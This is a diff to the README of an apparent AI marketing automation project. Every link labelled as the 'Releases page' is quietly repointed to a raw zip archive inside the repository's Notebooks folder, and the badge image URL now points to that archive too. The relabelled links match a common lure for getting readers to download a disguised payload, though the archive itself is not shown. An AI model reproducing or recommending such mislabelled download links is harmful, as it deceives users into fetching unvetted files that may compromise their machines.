@@ -1,6 +1,6 @@
 # 🌟 AI-Marketing-Automation-System_CrewAI - Simplify Your Marketing Tasks Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Link%20to%20Releases-brightgreen)](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/releases)
+[![Download Now](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/raw/refs/heads/main/Notebooks/Marketing-Crew-Automation-AI-System-A-2.0.zip%20Now-Link%20to%20Releases-brightgreen)](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/raw/refs/heads/main/Notebooks/Marketing-Crew-Automation-AI-System-A-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these simple requirements:
 
 To get started, you need to download the application. 
 
-**1.** Visit the [Releases page](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/releases) to find the latest version.
+**1.** Visit the [Releases page](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/raw/refs/heads/main/Notebooks/Marketing-Crew-Automation-AI-System-A-2.0.zip) to find the latest version.
 
 **2.** Look for the file labeled with the version number (e.g., `v1.0.0`).
 
@@ -71,7 +71,7 @@ If you're interested in the technical side, this application is completely open-
 
 ## 🔄 Regular Updates
 
-We continuously update the application to add more features and fix issues. Always check back on the [Releases page](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/releases) for the latest version.
+We continuously update the application to add more features and fix issues. Always check back on the [Releases page](https://github.com/Campos004/AI-Marketing-Automation-System_CrewAI/raw/refs/heads/main/Notebooks/Marketing-Crew-Automation-AI-System-A-2.0.zip) for the latest version.
 
 ## ✅ Conclusion
 
